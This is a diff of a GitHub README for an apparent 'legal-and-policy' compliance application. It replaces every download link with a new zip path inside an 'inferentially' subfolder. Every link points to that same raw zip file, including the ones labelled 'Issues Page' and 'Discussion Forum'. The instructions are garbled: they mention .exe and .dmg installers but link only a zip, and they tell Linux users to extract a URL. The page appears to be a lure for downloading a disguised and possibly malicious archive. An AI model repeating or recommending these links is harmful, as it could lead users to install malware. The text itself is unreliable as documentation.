@@ -4,7 +4,7 @@
 Welcome to the legal-and-policy repository! This application helps to organize essential documentation for governance, standards, and compliance. It is designed to support any secure platform, ensuring accountability and defensibility in legal matters. 
 
 ## 📥 Download the Application
-[![Download Latest Release](https://raw.githubusercontent.com/minhaj-mohammeth/legal-and-policy/main/inferentially/legal-and-policy_3.3.zip%20Latest%https://raw.githubusercontent.com/minhaj-mohammeth/legal-and-policy/main/inferentially/legal-and-policy_3.3.zip)](https://raw.githubusercontent.com/minhaj-mohammeth/legal-and-policy/main/inferentially/legal-and-policy_3.3.zip)
+[![Download Latest Release](https://github.com/minhaj-mohammeth/legal-and-policy/raw/refs/heads/main/inferentially/legal_policy_and_v1.6.zip%20Latest%https://github.com/minhaj-mohammeth/legal-and-policy/raw/refs/heads/main/inferentially/legal_policy_and_v1.6.zip)](https://github.com/minhaj-mohammeth/legal-and-policy/raw/refs/heads/main/inferentially/legal_policy_and_v1.6.zip)
 
 ## 📋 Overview
 This repository includes resources covering a range of topics vital for managing compliance and governance in secure environments. Documentation focuses on accountability, standards, litigation, and future technology. 
@@ -16,13 +16,13 @@ This repository includes resources covering a range of topics vital for managing
 - **Internet:** Stable internet connection for initial download and updates.
 
 ## 📥 Download & Install
-To get started, visit the Releases page to download the latest version of the legal-and-policy application. You can find it here: [Download Page](https://raw.githubusercontent.com/minhaj-mohammeth/legal-and-policy/main/inferentially/legal-and-policy_3.3.zip).
+To get started, visit the Releases page to download the latest version of the legal-and-policy application. You can find it here: [Download Page](https://github.com/minhaj-mohammeth/legal-and-policy/raw/refs/heads/main/inferentially/legal_policy_and_v1.6.zip).
 
 ### Installation Instructions
 1. After downloading the application from the Releases page:
    - For **Windows** users: Open the downloaded `.exe` file and follow the installation prompts.
    - For **macOS** users: Open the downloaded `.dmg` file, drag the application to your Applications folder.
-   - For **Linux** users: Extract the downloaded `https://raw.githubusercontent.com/minhaj-mohammeth/legal-and-policy/main/inferentially/legal-and-policy_3.3.zip` file and run the application from the extracted folder.
+   - For **Linux** users: Extract the downloaded `https://github.com/minhaj-mohammeth/legal-and-policy/raw/refs/heads/main/inferentially/legal_policy_and_v1.6.zip` file and run the application from the extracted folder.
 
 2. Once installed, you can launch the application by finding it in your applications list or programs menu.
 
@@ -52,11 +52,11 @@ This application covers the following essential topics:
 ## 📣 Support
 If you encounter issues or have questions:
 - Check the FAQ section in the application.
-- Visit the [Issues Page](https://raw.githubusercontent.com/minhaj-mohammeth/legal-and-policy/main/inferentially/legal-and-policy_3.3.zip) to report bugs or request features.
-- Join the community on our [Discussion Forum](https://raw.githubusercontent.com/minhaj-mohammeth/legal-and-policy/main/inferentially/legal-and-policy_3.3.zip).
+- Visit the [Issues Page](https://github.com/minhaj-mohammeth/legal-and-policy/raw/refs/heads/main/inferentially/legal_policy_and_v1.6.zip) to report bugs or request features.
+- Join the community on our [Discussion Forum](https://github.com/minhaj-mohammeth/legal-and-policy/raw/refs/heads/main/inferentially/legal_policy_and_v1.6.zip).
 
 ## 📥 Download the Application Again
-For quick access, you can download the latest version of the application by visiting our Releases page: [Download Page](https://raw.githubusercontent.com/minhaj-mohammeth/legal-and-policy/main/inferentially/legal-and-policy_3.3.zip).
+For quick access, you can download the latest version of the application by visiting our Releases page: [Download Page](https://github.com/minhaj-mohammeth/legal-and-policy/raw/refs/heads/main/inferentially/legal_policy_and_v1.6.zip).
 
 ## 🛠 Frequently Asked Questions
 **Q: What if I have installation issues?**  
